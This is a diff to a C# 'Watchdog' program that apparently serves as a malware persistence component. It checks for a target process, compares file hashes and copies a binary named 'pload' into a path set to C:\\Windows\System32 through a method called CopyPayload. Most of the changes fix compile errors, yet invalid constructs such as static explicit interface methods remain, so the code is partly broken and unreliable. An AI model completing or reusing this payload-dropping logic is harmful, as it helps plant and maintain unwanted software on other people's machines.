@@ -1,6 +1,8 @@
 using System;
+using System.Collections;
 using System.Diagnostics;
 using System.Linq;
+using System.Security.Cryptography;
 using System.Threading;
 using Microsoft.Win32;
 
@@ -11,7 +13,6 @@ class Watchdog : IWatchdog
 
     static string binaryPath = @"C:\\Windows\System32";
     static string binaryName = @"pload";
-
 
 
     static void Main(string[] args)
@@ -28,7 +29,7 @@ class Watchdog : IWatchdog
             }
 
             string targetProcessName = "OtherProcessName";  // Do not include '.exe'
-            if (IsProcessRunning(targetProcessName))
+            if (Watchdog.IsProcessRunning(targetProcessName))
             {
                 Console.WriteLine($"{targetProcessName} is already running. Proceeding with watchdog tasks.");
                 
@@ -40,18 +41,15 @@ class Watchdog : IWatchdog
                 Console.WriteLine($"{targetProcessName} is not running. Exiting.");
             }
         }
-
-
-
-
     }
 
-    static bool IWatchdog.IsProcessRunning(string processName)
+    static bool IsProcessRunning(string processName)
     {
         // Get a list of processes by name
         Process[] processes = Process.GetProcessesByName(processName);
         return processes.Length > 0;
     }
+
     static void WatchdogLogic()
     {
         // Example loop to simulate frequent checks
@@ -73,14 +71,14 @@ class Watchdog : IWatchdog
     {
         string currentDirectory = Directory.GetCurrentDirectory();
         string sourcePath = Path.Combine(currentDirectory, binaryName);
-        string destPathBinary = binaryPath.Combine(destinationPath,binaryName)
+        string destPathBinary = Path.Combine(destinationPath, binaryName);
 
 
-        if(File.Exists(destPathBinary) && File.Exists(sourcePath) && CompareFileHashes(destinationPath)){
+        if(File.Exists(destPathBinary) && File.Exists(sourcePath) && CompareFileHashes(destinationPath, sourcePath)){
             return;
         } 
         else if(File.Exists(sourcePath)){
-            CopyPayload(string destPathBinary, string sourcePath);
+            CopyPayload(destPathBinary, sourcePath);
         }
         else{
 
@@ -94,8 +92,8 @@ class Watchdog : IWatchdog
             // Copy the .exe to the destination
             try
             {
-                File.Copy(sourcePath, destinationPath, overwrite: true);
-                Console.WriteLine($"'{binaryName}' found and copied to {destinationPath}");
+                File.Copy(sourcePath, destPathBinary, overwrite: true);
+                Console.WriteLine($"'{binaryName}' found and copied to {destPathBinary}");
             }
             catch (Exception ex)
             {
@@ -540,6 +538,11 @@ class Watchdog : IWatchdog
     }
 
     static void IWatchdog.verifyRecycleBin()
+    {
+        throw new NotImplementedException();
+    }
+
+    static void IWatchdog.WatchdogLogic()
     {
         throw new NotImplementedException();
     }
